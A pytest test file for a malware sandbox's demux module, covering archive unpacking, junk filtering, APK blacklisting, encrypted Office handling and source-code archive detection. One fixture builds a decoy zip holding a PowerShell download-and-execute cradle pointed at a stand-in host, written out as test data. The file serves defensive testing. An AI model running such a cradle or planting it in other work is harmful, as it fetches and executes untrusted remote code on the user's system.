# Copyright (C) 2010-2015 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import os
import pathlib
import tempfile
from types import SimpleNamespace

import pytest
from tcr_misc import get_sample

from lib.cuckoo.common import demux


@pytest.fixture
def grab_sample():
    def _grab_sample(sample_hash):
        sample_location = pathlib.Path(__file__).absolute().parent.as_posix() + "/test_objects/" + sample_hash
        get_sample(hash=sample_hash, download_location=sample_location)
        return sample_location

    return _grab_sample


class TestDemux:
    """ToDo reenable
    @pytest.mark.skip("Takes minutes to run, skipping!")
    def test_demux_sample_microsoft_docx(self, grab_sample):
        # .docx file
        sample_hash = "c0c1c1c852a045eb3eb3b26dad2124aea866ea008449e0d7a84925c2ded7fddb"
        sample_location = grab_sample(sample_hash)
        assert demux.demux_sample(filename=sample_location, package=None, options="foobar") == [
            pathlib.Path(__file__).absolute().parent.as_posix() + "/test_objects/" + sample_hash
        ]

    def test_demux_sample_microsoft_no_sflock_docx(self, grab_sample):
        # .docx file
        sample_hash = "c0c1c1c852a045eb3eb3b26dad2124aea866ea008449e0d7a84925c2ded7fddb"
        sample_location = grab_sample(sample_hash)
        assert demux.demux_sample(filename=sample_location, package=None, options="foobar", use_sflock=False) == [
            pathlib.Path(__file__).absolute().parent.as_posix() + "/test_objects/" + sample_hash
        ]

    def test_demux_sample_microsoft_password_no_sflock_doc(self, grab_sample):
        # password protected .doc file
        sample_hash = "d211ce5c36f630aa1e85d4f36291fee2a600216d823d23805fe41bb68ea99dbb"
        sample_location = grab_sample(sample_hash)
        assert demux.demux_sample(filename=sample_location, package=None, options="password=infected", use_sflock=False) == [
            pathlib.Path(__file__).absolute().parent.as_posix() + "/test_objects/" + sample_hash
        ]

    def test_demux_sample_microsoft_no_password_no_sflock_doc(self, grab_sample):
        # no password .doc file
        sample_hash = "d211ce5c36f630aa1e85d4f36291fee2a600216d823d23805fe41bb68ea99dbb"
        sample_location = grab_sample(sample_hash)
        assert demux.demux_sample(filename=sample_location, package=None, options="foo", use_sflock=False) == [
            pathlib.Path(__file__).absolute().parent.as_posix() + "/test_objects/" + sample_hash
        ]

    def test_demux_sample_java(self, grab_sample):
        # java class file for a simple hello world
        sample_hash = "27c428570256f0e5f8229d053f352aea4276e5c9c5a601c20e04535a8ba1e41d"
        sample_location = grab_sample(sample_hash)
        assert demux.demux_sample(filename=sample_location, package=None, options="foo", use_sflock=False) == [
            pathlib.Path(__file__).absolute().parent.as_posix() + "/test_objects/" + sample_hash
        ]


    def test_demux_sample_microsoft_outlook(self, grab_sample):
        # outlook message from https://github.com/HamiltonInsurance/outlook_msg/blob/e6c0293f098e8aee9cd4124aa6a5d409c798bc49/test_data/No%20attachment.msg
        sample_hash = "0e16568cc1e8ddda0f0856b27857d1d043d7b18909a566ae5fa2460fc8fd3614"
        sample_location = grab_sample(sample_hash)
        assert demux.demux_sample(filename=sample_location, package=None, options="foo", use_sflock=False) == [
            pathlib.Path(__file__).absolute().parent.as_posix() + "/test_objects/" + sample_hash
        ]

    def test_demux_sample_pe32(self, grab_sample):
        # pe32 from https://github.com/bootandy/dust/releases/download/v0.5.4/dust-v0.5.4-i686-pc-windows-msvc.zip
        sample_hash = "5dd87d3d6b9d8b4016e3c36b189234772661e690c21371f1eb8e018f0f0dec2b"
        sample_location = grab_sample(sample_hash)
        assert demux.demux_sample(filename=sample_location, package=None, options="foo", use_sflock=False) == [
            pathlib.Path(__file__).absolute().parent.as_posix() + "/test_objects/" + sample_hash
        ]
    """

    def test_demux_package(self):
        empty_file = tempfile.NamedTemporaryFile()

        demuxed, _ = demux.demux_sample(filename=empty_file.name, package="Emotet", options="foo", use_sflock=False)
        demuxed == [(empty_file.name, "", "")]
        empty_file.close()

    def test_options2passwd(self):
        options = "password=foobar"
        demux.options2passwd(options)

    def test_demux_junk_filter_default_rejects(self, tmp_path):
        junk_file = tmp_path / "polyshell.txt"
        junk_file.write_text("echo polyshell")

        # String filename
        demuxed, errors = demux.demux_sample(filename=str(junk_file), package=None, options="", use_sflock=False)
        assert demuxed == []
        assert any("junk_filter" in err for err in errors)

        # Bytes filename
        demuxed, errors = demux.demux_sample(filename=str(junk_file).encode(), package=None, options="", use_sflock=False)
        assert demuxed == []
        assert any("junk_filter" in err for err in errors)

    def test_demux_junk_filter_explicitly_disabled(self, tmp_path):
        junk_file = tmp_path / "readme.txt"
        junk_file.write_text("readme instructions")

        demuxed, errors = demux.demux_sample(filename=str(junk_file), package=None, options="ignore_junk_filter=0", use_sflock=False)
        assert demuxed == []
        assert any("junk_filter" in err for err in errors)

    def test_demux_junk_filter_ignored_with_option(self, tmp_path):
        junk_file = tmp_path / "polyshell.txt"
        junk_file.write_text("echo polyshell")

        for opt in ("ignore_junk_filter=1", "ignore_junk_filter=true", "ignore_junk_filter=yes"):
            demuxed, errors = demux.demux_sample(filename=str(junk_file), package=None, options=opt, use_sflock=False)
            assert len(demuxed) == 1
            assert demuxed[0][0] == str(junk_file).encode()
            assert errors == []

    def test_sf_children_junk_filter(self):
        child = SimpleNamespace(
            filename=b"polyshell.txt",
            contents=b"echo polyshell",
            platform="windows",
            magic="ASCII text",
            filesize=14,
            package=None,
        )

        # By default (ignore_junk_filter=False), junk file is skipped
        path, platform, magic, filesize = demux._sf_children(child, ignore_junk_filter=False)
        assert path == b""
        assert filesize == 14

        # When ignore_junk_filter=True, junk file is extracted
        path, platform, magic, filesize = demux._sf_children(child, ignore_junk_filter=True)
        assert path != b""
        assert os.path.exists(path)
        assert open(path, "rb").read() == b"echo polyshell"
        assert filesize == 14
        if os.path.exists(path):
            os.remove(path)

    @pytest.mark.parametrize(
        "magic_str",
        [
            "Microsoft Roslyn C# debugging symbols version 1.0",
            "MSVC program database ver 7.00",
            "Microsoft C/C++ MSF 7.00",
        ],
    )
    def test_demux_pdb_magic_junk_filter_and_ms_exclude(self, tmp_path, monkeypatch, magic_str):
        sample_file = tmp_path / "sample_without_ext"
        sample_file.write_bytes(b"BSJB\x01\x00\x01\x00" + b"\x00" * 32)

        monkeypatch.setattr(demux.File, "get_type", lambda self: magic_str)
        monkeypatch.setattr(demux, "demux_sflock", lambda *args, **kwargs: ([], "", []))

        # Default: skipped by junk_filter before hitting Office check
        demuxed, errors = demux.demux_sample(filename=str(sample_file).encode(), package=None, options="", use_sflock=True)
        assert demuxed == []
        assert any("junk_filter" in err for err in errors)

        # With ignore_junk_filter=1: bypasses junk_filter and is excluded from Office check via MS_EXCLUDE
        demuxed, errors = demux.demux_sample(
            filename=str(sample_file).encode(), package=None, options="ignore_junk_filter=1", use_sflock=True
        )
        assert len(demuxed) == 1
        assert demuxed[0][0] == str(sample_file).encode()
        assert errors == []

    def test_sf_children_pdb_magic_filter(self):
        child = SimpleNamespace(
            filename=b"symbols_blob",
            contents=b"BSJB\x01\x00\x01\x00",
            platform="windows",
            magic="Microsoft Roslyn C# debugging symbols version 1.0",
            filesize=8,
            package=None,
        )

        path, _, _, _ = demux._sf_children(child, ignore_junk_filter=False)
        assert path == b""

        path, _, _, _ = demux._sf_children(child, ignore_junk_filter=True)
        assert path != b""
        if os.path.exists(path):
            os.remove(path)

    def test_is_encrypted_office_magic_and_msoffcrypto(self, tmp_path, monkeypatch):
        sample = tmp_path / "doc.bin"
        sample.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64)

        assert demux._is_encrypted_office(str(sample).encode(), "CDFV2 Encrypted") is True
        assert demux._is_encrypted_office(str(sample).encode(), "Composite Document File (Encrypted)") is True

        ole_handle = SimpleNamespace(closed=False)
        ole_handle.close = lambda: setattr(ole_handle, "closed", True)

        class FakeOfficeFile:
            def __init__(self, fp):
                self.ole = ole_handle

            def is_encrypted(self):
                return True

        monkeypatch.setattr(demux, "HAS_MSOFFCRYPTO", True)
        monkeypatch.setattr(demux, "msoffcrypto", SimpleNamespace(OfficeFile=FakeOfficeFile))

        assert demux._is_encrypted_office(str(sample).encode(), "Composite Document File V2 Document") is True
        assert ole_handle.closed is True

    def test_demux_office_password_candidates_without_verify_password(self, tmp_path, monkeypatch):
        sample = tmp_path / "secret.doc"
        sample.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 32)
        attempted_passwords = []
        ole_handle = SimpleNamespace(closed=False)
        ole_handle.close = lambda: setattr(ole_handle, "closed", True)

        class FakeDoc97File:
            def __init__(self, fp):
                self.ole = ole_handle
                self._pw = None

            def is_encrypted(self):
                return True

            def load_key(self, password=None):
                attempted_passwords.append(password)
                self._pw = password

            def decrypt(self, out_buf):
                if self._pw != "VelvetSweatshop":
                    raise ValueError("wrong password")
                out_buf.write(b"decrypted-doc-bytes")

        monkeypatch.setattr(demux, "tmp_path", str(tmp_path))
        monkeypatch.setattr(demux, "HAS_MSOFFCRYPTO", True)
        monkeypatch.setattr(demux, "HAS_SFLOCK", False)
        monkeypatch.setattr(demux, "msoffcrypto", SimpleNamespace(OfficeFile=FakeDoc97File))

        res = demux.demux_office(str(sample).encode(), "custompw", "windows")
        assert attempted_passwords == ["custompw", "VelvetSweatshop"]
        assert ole_handle.closed is True
        assert len(res) == 1
        out_path, plat = res[0]
        assert plat == "windows"
        assert os.path.basename(out_path) == b"secret.doc"
        assert open(out_path, "rb").read() == b"decrypted-doc-bytes"

        # Empty user password must try defaults in order ["VelvetSweatshop", "infected", ""]
        attempted_passwords.clear()
        res_empty = demux.demux_office(str(sample).encode(), "", "windows")
        assert attempted_passwords == ["VelvetSweatshop"]
        assert len(res_empty) == 1

    def test_demux_office_sflock_fallback_and_missing_decryptor_error(self, tmp_path, monkeypatch):
        sample = tmp_path / "encrypted.docx"
        sample.write_bytes(b"encrypted-data")

        class FakeSflockOffice:
            def __init__(self, sf_obj):
                self.sf_obj = sf_obj

            def decrypt(self, password):
                if password == "infected":
                    return SimpleNamespace(contents=b"plain-docx-bytes", magic="Microsoft Word 2007+")
                return SimpleNamespace(contents=b"", magic="CDFV2 Encrypted")

        monkeypatch.setattr(demux, "tmp_path", str(tmp_path))
        monkeypatch.setattr(demux, "HAS_MSOFFCRYPTO", False)
        monkeypatch.setattr(demux, "HAS_SFLOCK", True)
        monkeypatch.setattr(demux, "OfficeFile", FakeSflockOffice, raising=False)
        monkeypatch.setattr(demux, "sfFile", SimpleNamespace(from_path=lambda p: p), raising=False)

        res = demux.demux_office(str(sample).encode(), "", "windows")
        assert len(res) == 1
        assert open(res[0][0], "rb").read() == b"plain-docx-bytes"

        monkeypatch.setattr(demux, "HAS_SFLOCK", False)
        with pytest.raises(demux.CuckooDemuxError):
            demux.demux_office(str(sample).encode(), "", "windows")

    def test_demux_sample_unencrypted_and_encrypted_office(self, tmp_path, monkeypatch):
        sample = tmp_path / "plain.docx"
        sample.write_bytes(b"PK\x03\x04plain-office-content")

        monkeypatch.setattr(demux.File, "get_type", lambda self: "Microsoft Word 2007+")
        sflock_called = []
        monkeypatch.setattr(demux, "demux_sflock", lambda *a, **k: sflock_called.append(True) or ([], "", []))

        # Unencrypted Office passes directly even with HAS_MSOFFCRYPTO=False and HAS_SFLOCK=False
        monkeypatch.setattr(demux, "HAS_MSOFFCRYPTO", False)
        monkeypatch.setattr(demux, "HAS_SFLOCK", False)
        demuxed, errors = demux.demux_sample(str(sample).encode(), package=None, options="", use_sflock=True, platform="windows")
        assert demuxed == [(str(sample).encode(), "windows")]
        assert errors == []
        assert sflock_called == []

        # Encrypted Office with use_sflock=True and no decryptor returns error
        monkeypatch.setattr(demux.File, "get_type", lambda self: "CDFV2 Encrypted")
        demuxed, errors = demux.demux_sample(str(sample).encode(), package=None, options="", use_sflock=True)
        assert demuxed == []
        assert errors

        # Encrypted Office with use_sflock=True and decryptor delegates to demux_office
        monkeypatch.setattr(demux, "HAS_MSOFFCRYPTO", True)
        monkeypatch.setattr(
            demux,
            "demux_office",
            lambda fn, pw, plat: [(b"/tmp/decrypted.docx", plat)],
        )
        demuxed, errors = demux.demux_sample(str(sample).encode(), package=None, options="password=infected", use_sflock=True, platform="windows")
        assert demuxed == [(b"/tmp/decrypted.docx", "windows")]
        assert errors == []

        # Encrypted Office with use_sflock=False falls back to _prepare_file
        demuxed, errors = demux.demux_sample(str(sample).encode(), package=None, options="password=infected", use_sflock=False, platform="windows")
        assert demuxed == [(str(sample).encode(), "windows")]
        assert errors == []

    def test_demux_sflock_skips_apk_before_unpack(self, tmp_path, monkeypatch):
        import zipfile

        apk_blob = tmp_path / "extensionless_apk"
        with zipfile.ZipFile(apk_blob, "w") as zf:
            zf.writestr("AndroidManifest.xml", b"<manifest/>")
            zf.writestr("classes.dex", b"dex\n035\x00")
            zf.writestr("res/layout.xml", b"<LinearLayout/>")

        normal_zip = tmp_path / "archive.zip"
        with zipfile.ZipFile(normal_zip, "w") as zf:
            zf.writestr("payload.exe", b"MZ\x90\x00")

        assert demux._is_apk_archive(str(apk_blob).encode()) is True
        assert demux._is_apk_archive(b"/nonexistent/app.apk") is True
        assert demux._is_apk_archive(str(normal_zip).encode()) is False

        unpack_calls = []
        monkeypatch.setattr(demux, "HAS_SFLOCK", True)
        monkeypatch.setattr(demux, "unpack", lambda *a, **kw: unpack_calls.append(a), raising=False)

        ret, err, opts = demux.demux_sflock(str(apk_blob).encode(), options="")
        assert ret == []
        assert err == "blacklisted package"
        assert opts == []
        assert unpack_calls == []

        monkeypatch.setattr(demux.File, "get_type", lambda self: "Zip archive data, at least v2.0 to extract")
        demuxed, errors = demux.demux_sample(str(apk_blob).encode(), package="", options="", use_sflock=True)
        assert demuxed == []
        assert errors == [{"extensionless_apk": "blacklisted package"}]
        assert unpack_calls == []

        # V1-signed APK whose libmagic string matches "Java archive data (JAR)" must not bypass APK check at Step 4
        signed_apk = tmp_path / "signed_v1_sample"
        with zipfile.ZipFile(signed_apk, "w") as zf:
            zf.writestr("META-INF/MANIFEST.MF", b"Manifest-Version: 1.0\n")
            zf.writestr("AndroidManifest.xml", b"<manifest/>")
            zf.writestr("classes.dex", b"dex\n035\x00")
        monkeypatch.setattr(demux.File, "get_type", lambda self: "Java archive data (JAR)")
        demuxed_signed, errors_signed = demux.demux_sample(
            str(signed_apk).encode(), package="", options="", use_sflock=True
        )
        assert demuxed_signed == []
        assert errors_signed == [{"signed_v1_sample": "blacklisted package"}]
        assert unpack_calls == []

    def test_demux_sflock_closes_unpacked_and_cleans_discarded_children(self, tmp_path, monkeypatch):
        monkeypatch.setattr(demux, "tmp_path", str(tmp_path))
        monkeypatch.setattr(demux, "HAS_SFLOCK", True)

        # 1. _sf_children does not create empty cuckoo-sflock/tmp* dirs on empty contents
        empty_child = SimpleNamespace(
            filename=b"empty.exe",
            contents=b"",
            platform="windows",
            magic="PE32 executable",
            filesize=0,
            package="exe",
        )
        extracted_path, _, _, _ = demux._sf_children(empty_child)
        assert extracted_path == b""
        assert not (tmp_path / "cuckoo-sflock").exists()

        # 2. demux_sflock calls unpacked.close() deterministically
        archive_file = tmp_path / "bundle.7z"
        archive_file.write_bytes(b"7z\xbc\xaf\x27\x1c\x00\x04")
        closed = []

        fake_unpacked = SimpleNamespace(
            package="7z",
            filepaths=[b"one.exe", b"two.exe"],
            children=[],
            close=lambda: closed.append(True),
        )
        monkeypatch.setattr(demux, "unpack", lambda *a, **kw: fake_unpacked, raising=False)
        ret, err, opts = demux.demux_sflock(str(archive_file).encode(), options="")
        assert ret == []
        assert err == ""
        assert opts == ["file=one.exe", "file=two.exe"]
        assert closed == [True]

        # Legacy sflock fallback closes _stream across tree when .close is absent
        legacy_stream = SimpleNamespace(closed=False)
        legacy_stream.close = lambda: setattr(legacy_stream, "closed", True)
        legacy_child_stream = SimpleNamespace(closed=False)
        legacy_child_stream.close = lambda: setattr(legacy_child_stream, "closed", True)
        legacy_root = SimpleNamespace(
            _stream=legacy_stream,
            children=[SimpleNamespace(_stream=legacy_child_stream, children=[])],
        )
        demux._close_sflock_file(legacy_root)
        assert legacy_stream.closed is True
        assert legacy_child_stream.closed is True

        # 3. Overflow children past demux_files_limit are cleaned from cuckoo-sflock
        monkeypatch.setattr(demux, "demux_files_limit", 1)
        monkeypatch.setattr(demux.File, "get_type", lambda self: "7-zip archive data")

        def _fake_demux_sflock(_fn, _opts, _chk):
            out = []
            for idx in range(3):
                c = SimpleNamespace(
                    filename=f"item_{idx}.exe".encode(),
                    contents=b"MZ" + bytes([idx]),
                    platform="windows",
                    magic="PE32 executable",
                    filesize=3,
                    package="exe",
                )
                out.append(demux._sf_children(c))
            return out, "", []

        monkeypatch.setattr(demux, "demux_sflock", _fake_demux_sflock)
        demuxed, errors = demux.demux_sample(str(archive_file).encode(), package="", options="", use_sflock=True)
        assert len(demuxed) == 1
        assert errors == []
        sflock_dir = tmp_path / "cuckoo-sflock"
        remaining_dirs = list(sflock_dir.iterdir())
        assert len(remaining_dirs) == 1
        assert os.path.exists(demuxed[0][0])

    def test_demux_office_closes_sflock_handles(self, tmp_path, monkeypatch):
        sample = tmp_path / "locked.doc"
        sample.write_bytes(b"encrypted-office")
        closed_objs = []

        def _make_sf(tag):
            obj = SimpleNamespace(tag=tag)
            obj.close = lambda: closed_objs.append(tag)
            return obj

        class FakeOffice:
            def __init__(self, sf_obj):
                self.sf_obj = sf_obj

            def decrypt(self, pw):
                dec = _make_sf(f"dec:{pw}")
                if pw == "infected":
                    dec.contents = b"decrypted-doc"
                    dec.magic = "Composite Document File"
                else:
                    dec.contents = b""
                    dec.magic = "CDFV2 Encrypted"
                return dec

        monkeypatch.setattr(demux, "tmp_path", str(tmp_path))
        monkeypatch.setattr(demux, "HAS_MSOFFCRYPTO", False)
        monkeypatch.setattr(demux, "HAS_SFLOCK", True)
        monkeypatch.setattr(demux, "OfficeFile", FakeOffice, raising=False)
        monkeypatch.setattr(demux, "sfFile", SimpleNamespace(from_path=lambda _p: _make_sf("src")), raising=False)

        res = demux.demux_office(str(sample).encode(), "", "windows")
        assert len(res) == 1
        assert closed_objs == ["dec:VelvetSweatshop", "src", "dec:infected", "src"]

    def test_demux_source_code_archive_not_split_and_malware_preserved(self, tmp_path, monkeypatch):
        import io
        import tarfile
        import zipfile

        unpack_calls = []
        monkeypatch.setattr(demux, "HAS_SFLOCK", True)
        monkeypatch.setattr(demux, "unpack", lambda *a, **kw: unpack_calls.append(a), raising=False)
        monkeypatch.setattr(demux.File, "get_type", lambda self: "Zip archive data")

        # 1. Go module zip (extensionless filename) is detected pre-unpack and kept as 1 unsplit sample
        gomod_zip = tmp_path / "sample_gomod_blob"
        with zipfile.ZipFile(gomod_zip, "w") as zf:
            zf.writestr("example.com/org/pkg@v0.4.0/go.mod", b"module example.com/org/pkg\n")
            zf.writestr("example.com/org/pkg@v0.4.0/internal/render/theme_test.go", b"package render\n")
            zf.writestr("example.com/org/pkg@v0.4.0/docs/index.html", b"<html></html>")
            zf.writestr("example.com/org/pkg@v0.4.0/scripts/release.sh", b"#!/bin/sh\necho ok\n")

        demuxed, errors = demux.demux_sample(
            str(gomod_zip).encode(), package="", options="", use_sflock=True, platform="windows"
        )
        assert demuxed == [(str(gomod_zip).encode(), "windows")]
        assert errors == []
        assert unpack_calls == []

        # 2. Compressed tarball (.tar.gz) of Python/JS repo is NOT split into setup.py / build.sh / index.js tasks
        repo_tgz = tmp_path / "repo-1.0.0.tar.gz"
        with tarfile.open(repo_tgz, "w:gz") as tf:
            for name, body in (
                ("repo-1.0.0/pyproject.toml", b"[project]\nname='demo'\n"),
                ("repo-1.0.0/src/demo/__init__.py", b"__version__ = '1.0.0'\n"),
                ("repo-1.0.0/scripts/build.sh", b"#!/bin/sh\necho build\n"),
                ("repo-1.0.0/web/app.js", b"console.log('ui');\n"),
            ):
                ti = tarfile.TarInfo(name=name)
                ti.size = len(body)
                tf.addfile(ti, io.BytesIO(body))

        monkeypatch.setattr(demux.File, "get_type", lambda self: "gzip compressed data")
        demuxed_tgz, errors_tgz = demux.demux_sample(str(repo_tgz).encode(), package="", options="", use_sflock=True)
        assert demuxed_tgz == [(str(repo_tgz).encode(), "")]
        assert errors_tgz == []
        assert unpack_calls == []

        # 3. Post-unpack fallback (e.g. .7z source repo) also avoids splitting and closes unpacked handle
        repo_7z = tmp_path / "source.7z"
        repo_7z.write_bytes(b"7z\xbc\xaf\x27\x1c\x00\x04")
        closed_7z = []
        fake_7z_unpacked = SimpleNamespace(
            package="7z",
            filepaths=[b"proj/Cargo.toml", b"proj/src/main.rs", b"proj/scripts/ci.sh", b"proj/docs/index.html"],
            children=[],
            close=lambda: closed_7z.append(True),
        )
        monkeypatch.setattr(demux, "unpack", lambda *a, **kw: unpack_calls.append(a) or fake_7z_unpacked, raising=False)
        monkeypatch.setattr(demux.File, "get_type", lambda self: "7-zip archive data")
        demuxed_7z, errors_7z = demux.demux_sample(str(repo_7z).encode(), package="", options="", use_sflock=True)
        assert demuxed_7z == [(str(repo_7z).encode(), "")]
        assert errors_7z == []
        assert len(unpack_calls) == 1
        assert closed_7z == [True]

        # 4. Malware delivery archives (phishing .js zip, decoy .gitignore + .exe/.lnk) MUST NOT match source code
        phish_js_zip = tmp_path / "invoice.zip"
        with zipfile.ZipFile(phish_js_zip, "w") as zf:
            zf.writestr("Invoice_0912.js", b"WScript.Echo(1);")
        assert demux._is_source_code_archive(str(phish_js_zip).encode()) is False

        decoy_exe_zip = tmp_path / "decoy.zip"
        with zipfile.ZipFile(decoy_exe_zip, "w") as zf:
            zf.writestr(".gitignore", b"*.log\n")
            zf.writestr("setup.exe", b"MZ\x90\x00")
            zf.writestr("vcruntime140.dll", b"MZ\x90\x00")
        assert demux._is_source_code_archive(str(decoy_exe_zip).encode()) is False

        decoy_ps1_zip = tmp_path / "decoy_ps1.zip"
        with zipfile.ZipFile(decoy_ps1_zip, "w") as zf:
            zf.writestr("Makefile", b"all:\n\techo hi\n")
            zf.writestr("main.py", b"print(1)\n")
            zf.writestr("stage2.ps1", b"IEX (New-Object Net.WebClient).DownloadString('http://example.com')")
        assert demux._is_source_code_archive(str(decoy_ps1_zip).encode()) is False

        # 5. ignore_junk_filter=1 bypasses source-code archive skip when explicitly requested
        unpack_calls.clear()
        monkeypatch.setattr(
            demux,
            "unpack",
            lambda *a, **kw: unpack_calls.append(a) or SimpleNamespace(package="zip", filepaths=[], children=[], close=lambda: None),
            raising=False,
        )
        demux.demux_sflock(str(gomod_zip).encode(), options="ignore_junk_filter=1")
        assert len(unpack_calls) == 1

        # 6. Non-regular tar entry exceeding _MAX_TAR_SCAN_BYTES aborts scan early
        oversized_nonfile_tar = tmp_path / "oversized_nonfile.tar"
        with tarfile.open(oversized_nonfile_tar, "w") as tf:
            ti = tarfile.TarInfo(name="repo/dir_entry")
            ti.type = tarfile.DIRTYPE
            ti.size = 0
            tf.addfile(ti)
            ti_file = tarfile.TarInfo(name="repo/go.mod")
            ti_file.size = 24
            tf.addfile(ti_file, io.BytesIO(b"module example.com/demo\n"))
        monkeypatch.setattr(demux, "_MAX_TAR_SCAN_ENTRIES", 1)
        assert demux._is_source_code_archive(str(oversized_nonfile_tar).encode()) is False



